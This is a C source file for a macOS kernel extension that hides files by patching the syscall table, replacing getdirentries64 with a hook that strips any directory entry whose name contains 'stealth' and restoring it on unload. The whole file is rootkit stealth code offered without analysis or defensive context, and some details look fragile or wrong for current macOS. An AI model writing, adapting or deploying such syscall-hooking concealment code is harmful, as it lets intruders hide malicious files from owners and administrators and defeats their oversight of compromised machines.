
// Hide files by patching filesystem syscalls
#include <sys/types.h>
#include <sys/dirent.h>
#include <libkern/libkern.h>
#include <mach/mach_types.h>
#include <sys/systm.h>
#include <sys/sysent.h>
#include <sys/proc.h>
#include <sys/fcntl.h>
#include <string.h>

#define HIDE_PATTERN "stealth"

typedef int (*getdirentries64_t)(struct proc *, struct getdirentries64_args *, user_ssize_t *);
extern struct sysent sysent[];

static getdirentries64_t original_getdirentries64 = NULL;

// Hooked version of getdirentries64 to filter out files containing HIDE_PATTERN in their name
int hooked_getdirentries64(struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval) {
    int ret = original_getdirentries64(p, uap, retval);
    if (ret || *retval == 0) return ret;

    user_addr_t buf = uap->buf;
    char kbuf[8192]; // Must be large enough to hold all entries
    if (*retval > sizeof(kbuf)) {
        // Don't handle buffers larger than kbuf
        return ret;
    }
    if (copyin(buf, kbuf, *retval) != 0) {
        return ret;
    }

    char *ptr = kbuf;
    char *end = kbuf + *retval;
    char *dst = kbuf;

    while (ptr < end) {
        struct dirent *dp = (struct dirent *)ptr;
        if (strstr(dp->d_name, HIDE_PATTERN) == NULL) {
            memmove(dst, dp, dp->d_reclen);
            dst += dp->d_reclen;
        }
        ptr += dp->d_reclen;
    }

    size_t new_size = dst - kbuf;
    if (copyout(kbuf, buf, new_size) != 0) {
        return ret;
    }
    *retval = new_size;

    return 0;
}

kern_return_t hide_fs_start(kmod_info_t *ki, void *d) {
    original_getdirentries64 = (getdirentries64_t)sysent[344].sy_call; // 344 = getdirentries64
    sysent[344].sy_call = (sy_call_t *)hooked_getdirentries64;
    return KERN_SUCCESS;
}

kern_return_t hide_fs_stop(kmod_info_t *ki, void *d) {
    sysent[344].sy_call = (sy_call_t *)original_getdirentries64;
    return KERN_SUCCESS;
}
